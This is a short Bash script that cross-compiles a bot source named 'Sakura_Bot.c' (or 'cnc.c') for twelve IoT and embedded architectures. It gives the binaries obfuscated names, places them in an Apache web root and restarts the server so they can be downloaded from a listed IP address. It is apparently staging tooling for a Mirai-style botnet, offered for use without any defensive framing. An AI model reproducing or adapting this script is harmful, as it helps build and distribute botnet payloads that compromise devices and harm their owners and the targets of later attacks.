#!/usr/bin/env bash
set -e

# 1) Adjust these if needed:
SRC="Sakura_Bot.c"   # or "cnc.c"
WEBROOT="/var/www/html"

# 2) Cross-compiler dirs (must match order below)
ccs=(
  cross-compiler-mips
  cross-compiler-mipsel
  cross-compiler-sh4
  cross-compiler-x86_64
  cross-compiler-armv6l
  cross-compiler-i686
  cross-compiler-powerpc
  cross-compiler-i586
  cross-compiler-m68k
  cross-compiler-armv7l
  cross-compiler-armv4l
  cross-compiler-armv5l
)

# 3) Desired output names in the same order
compileas=(
  m-i.p-s.Sakura
  m-p.s-l.Sakura
  s-h.4-.Sakura
  x-8.6-.Sakura
  a-r.m-6.Sakura
  x-3.2-.Sakura
  a-r.m-7.Sakura
  p-p.c-.Sakura
  i-5.8-6.Sakura
  m-6.8-k.Sakura
  a-r.m-4.Sakura
  a-r.m-5.Sakura
)

# 4) Compile loop
for i in "${!ccs[@]}"; do
  dir="${ccs[$i]}"
  out="${compileas[$i]}"
  arch="${dir#cross-compiler-}"
  gcc_bin="./${dir}/bin/${arch}-gcc"

  echo "[*] Compiling $SRC for $arch → $out"
  "$gcc_bin" -static -pthread -o "$out" "$SRC"
done

# 5) Copy into Apache’s web root
echo "[*] Copying binaries to $WEBROOT"
for out in "${compileas[@]}"; do
  mv -f "$out" "$WEBROOT/"
done

# 6) Ensure they’re executable
chmod +x "$WEBROOT"/*.Sakura

# 7) Restart Apache (on Ubuntu)
systemctl restart apache2

echo "[✔] Done! Browse http://196.77.63.59:8080 to see your binaries."
